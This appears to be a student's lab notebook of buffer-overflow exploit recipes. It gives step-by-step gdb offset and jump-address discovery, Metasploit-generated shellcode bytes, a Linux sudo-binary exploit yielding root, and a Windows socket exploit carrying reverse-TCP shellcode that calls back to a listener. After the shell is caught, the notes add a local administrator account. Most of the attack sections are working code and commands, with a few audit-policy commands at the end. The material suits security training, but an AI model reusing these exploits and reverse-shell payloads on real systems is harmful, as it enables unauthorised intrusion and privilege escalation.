# %% [markdown]
# # LINUX PAYLOAD

# %%
#LINUX PAYLOAD CRAFTING 

Extract info from host:

hostterminal$ gdb <filename>
gdb: show env
gdb: unset env

# before this go to wiremask and create your pattern and leave it open. 

gdb: r <insert pattern>  # this gets you the offset hex that you put into the wiremask for offset value  and we note that value

#then 

gdb: info proc map <copy sr add from below heap and rcvr addr from above stack> # here we record those hex vallue fpr the next command

#then 

gdb: find /b <0xf7de2000>,<0xf7ffe000>,0xff,0xe4  #from here we grab the top 5 or top 3 to pbe placed into our py script file build for payload. 


# Now we begin to build the payload and update the script

CMDS to create Payloads:

student@linops$; msfconsole

msf6$ 	use payload/linux/x86/exec
msf6$	set CMD '/bin/sh' 
msf6$	generate -b "\x00" -f python

#Once it generated you can copy and paste the payloaud output to the script file as the example below. 

#!/usr/bin/pyhton

test = 'A' * 55 #overwrite registers up to the eip
#'B' *4 this overwrites the instruction pointer
eip = '\x59\x3b\xde\xf7' 														# This all get updted with the new gathered intel from the system recon for GDB
'''																				#
0xf7de3b59																		#
0xf7f588ab
0xf7f645fb
0xf7f6460f
0xf7f64aeb
'''
nop = '\x90' * 10 	#the slash shows its actual bytes when sent to python
shell = 'nada'

# payload(linux/x86/exec) > generate -b "\0x00" -f python

buf =  b""
buf += b"\xbe\x18\x41\x31\x8f\xdb\xda\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x0f\x83\xe8\xfc\x31\x70\x0f\x03\x70"
buf += b"\x17\xa3\xc4\xe5\x2c\x7b\xbe\xa8\x54\x13\xed\x2f"
buf += b"\x11\x04\x85\x80\x52\xa3\x56\xb7\xbb\x51\x3e\x29"
buf += b"\x4a\x76\x92\x5d\x5a\x79\x13\x9e\x16\x16\x66\xfd"
buf += b"\xbe\xc8\xa7\x75\x53\x79\x97\x02\xc2\x17\x89\x89"
buf += b"\x66\xc6\x21\x2a\xf2\x16\x9d\x99\x73\xf7\xec\x9e"

print(test+eip+nop+buf)


move the file to the host box and directory that needs ot be placed into. 

- scp exploit.py user2@10.50.16.14:~
- or use the proxychains python3 -m http.server
- then chmod the file to be executable and proceed to run it 

# make sure your in the directory of where the file is located in:

user2@PublicFacingWebsite:/var/tmp$ sudo "./exploit_me" $(python exploit.py)
	    								#file paths		      #Python Script
        
#Output example: 
#	-user2@PublicFacingWebsite:/var/tmp$ sudo "./exploit_me" $(python exploit.py)
#You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAY���������������9)����t$�Z1ɱ
#                                                                                                ��1rr�US"�
#                                                                                                              �R���3uWV���Ī�O�~�X�~Hv�&�=�����VÕ

#no we are root so we can navigate to the home dir and search for the file and or potential flags. 
cd
# ls -l
total 36
-rwxr-xr-x 1 user2 user2  1002 Oct 16 16:06 exploit.py
-rwxr-xr-t 1  1000  1000 17436 Mar 13  2025 exploit_me
drwx------ 3 root  root   4096 Oct 13 13:02 systemd-private-47bcd01eefa149d0ba060cd914498618-apache2.service-jSvtX9
drwx------ 3 root  root   4096 Oct 16 17:23 systemd-private-47bcd01eefa149d0ba060cd914498618-systemd-resolved.service-lN01vQ
drwx------ 3 root  root   4096 Oct 13 12:59 systemd-private-47bcd01eefa149d0ba060cd914498618-systemd-timesyncd.service-P8qRj6
# sudo root
sudo: root: command not found
# su root
root@PublicFacingWebsite:/var/tmp# cd
root@PublicFacingWebsite:~# ls -l
total 4
-rw-r--r-- 1 root root 31 Oct 13 13:02 secret_msg.txt
root@PublicFacingWebsite:~#

# %% [markdown]
# # WINDOWS PAYLOAD

# %%
WINDOWS PAYLOAD CRAFTING 

Building script:

Student@lin-ops$ msfconsole

msf6 > use windows/shell_reverse_tcp
msf6 payloads(windows/shell_reverse_tcp) > 
msf6 payloads(windows/shell_reverse_tcp) > set LHOST 10.50.180.197 #this ip needs to be the box sent up to get the listening on 
msf6 payloads(windows/shell_reverse_tcp) > set LPORT 4444
msf6 payloads(windows/shell_reverse_tcp) > generate -b "\x00" -f python 

-------------------------------------------------------------------------------------------------------------------

#example of completed script:

student@lin-ops:~/Scripts$ cat Priveme.py
#!/usr/bin/python

import socket
command = "TRUN /.:/"

BUFF = "A" * 2003  #this will need to updated situational dependant

EIP ="\xA0\x12\x50\x62"
'''
0x625012A0
0x625012AD
0x625012BA
'''
NOP = "\x90" * 10

# PAYLOAD PLACEMENT
# VERBOSE=false, LHOST=10.50.180.197, LPORT=4444, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, 
# PrependMigrate=false, EXITFUNC=process, CreateSession=true, 
# AutoVerifySession=true
buf =  b""
buf += b"\xb8\xab\x84\x2c\x8c\xdd\xc0\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x52\x31\x43\x12\x83\xc3\x04\x03\xe8"
buf += b"\x8a\xce\x79\x12\x7a\x8c\x82\xea\x7b\xf1\x0b\x0f"
buf += b"\x4a\x31\x6f\x44\xfd\x81\xfb\x08\xf2\x6a\xa9\xb8"
buf += b"\x81\x1f\x66\xcf\x22\x95\x50\xfe\xb3\x86\xa1\x61"
buf += b"\x30\xd5\xf5\x41\x09\x16\x08\x80\x4e\x4b\xe1\xd0"
buf += b"\x07\x07\x54\xc4\x2c\x5d\x65\x6f\x7e\x73\xed\x8c"
buf += b"\x37\x72\xdc\x03\x43\x2d\xfe\xa2\x80\x45\xb7\xbc"
buf += b"\xc5\x60\x01\x37\x3d\x1e\x90\x91\x0f\xdf\x3f\xdc"
buf += b"\xbf\x12\x41\x19\x07\xcd\x34\x53\x7b\x70\x4f\xa0"
buf += b"\x01\xae\xda\x32\xa1\x25\x7c\x9e\x53\xe9\x1b\x55"
buf += b"\x5f\x46\x6f\x31\x7c\x59\xbc\x4a\x78\xd2\x43\x9c"
buf += b"\x08\xa0\x67\x38\x50\x72\x09\x19\x3c\xd5\x36\x79"
buf += b"\x9f\x8a\x92\xf2\x32\xde\xae\x59\x5b\x13\x83\x61"
buf += b"\x9b\x3b\x94\x12\xa9\xe4\x0e\xbc\x81\x6d\x89\x3b"
buf += b"\xe5\x47\x6d\xd3\x18\x68\x8e\xfa\xde\x3c\xde\x94"
buf += b"\xf7\x3c\xb5\x64\xf7\xe8\x1a\x34\x57\x43\xdb\xe4"
buf += b"\x17\x33\xb3\xee\x97\x6c\xa3\x11\x72\x05\x4e\xe8"
buf += b"\x15\x20\xbd\x46\x20\x5c\xc3\xa6\xba\xc1\x4a\x40"
buf += b"\xd6\xe9\x1a\xdb\x4f\x93\x06\x97\xee\x5c\x9d\xd2"
buf += b"\x31\xd6\x12\x23\xff\x1f\x5e\x37\x68\xd0\x15\x65"
buf += b"\x3f\xef\x83\x01\xa3\x62\x48\xd1\xaa\x9e\xc7\x86"
buf += b"\xfb\x51\x1e\x42\x16\xcb\x88\x70\xeb\x8d\xf3\x30"
buf += b"\x30\x6e\xfd\xb9\xb5\xca\xd9\xa9\x03\xd2\x65\x9d"
buf += b"\xdb\x85\x33\x4b\x9a\x7f\xf2\x25\x74\xd3\x5c\xa1"
buf += b"\x01\x1f\x5f\xb7\x0d\x4a\x29\x57\xbf\x23\x6c\x68"
buf += b"\x70\xa4\x78\x11\x6c\x54\x86\xc8\x34\x64\xcd\x50"
buf += b"\x1c\xed\x88\x01\x1c\x70\x2b\xfc\x63\x8d\xa8\xf4"
buf += b"\x1b\x6a\xb0\x7d\x19\x36\x76\x6e\x53\x27\x13\x90"
buf += b"\xc0\x48\x36"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.28.189", 9999))
print s.recv(1024)
s.send(command + BUFF + EIP + NOP + buf)
print s.recv(1024)
s.close()

#Payload completed 

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# now we begint he escalation of Prive attempt. If it doesnt work the first time go back to your payload and verufy everything is synthax proper if not regenrate. 
# Also, if need be verify your tunnels are reaching the box.

student@lin-ops:~$ proxychains nc -lvnp 4444            #Established a ls on my local box. 

# then we run the script from a different temrinal window 

student@lin-ops:~/Scripts$ proxychains ./Priveme.py     

# this drops me into the below root dir on the system I need to get access to.
# Example:

C:\Windows\system32>
 
# now we add the user <name> to the group for prov access. 

C:\Windows\system32>   net localgroup administrators aaron /add
net localgroup administrators <user> /add
The command completed successfully.

# we can now exit the shell and directly rdp to the box in order to begin enumeration and searching. 

student@lin-ops:~/Scripts$ proxychains xfreerdp /v:<IP> /u:<USERNAME> /p:<PASSWORD> /size:1920x1000 +clipboard

# Now we beging searching directories and files in order to find the flag and or answer questions.
#We begin windows commands to search and find  reffer to the recon file for synthax

auditpol /get /category:*
    # Basic: Shows all audit category setting

auditpol /get /category:* |findstr /i "success failure"
    # Show all audit category set for success, failure, or success and fail

auditpol /list /subcategory:"detailed Tracking","DS Access"
    # Displays sub policy's for "Detailed Tracking","DS Access" categories.

auditpol /get /option:crashonauditfail
    # Check options that effect the system as a whole when certain events occur. The example would cause the system to crash if auditing would become unable to log events.
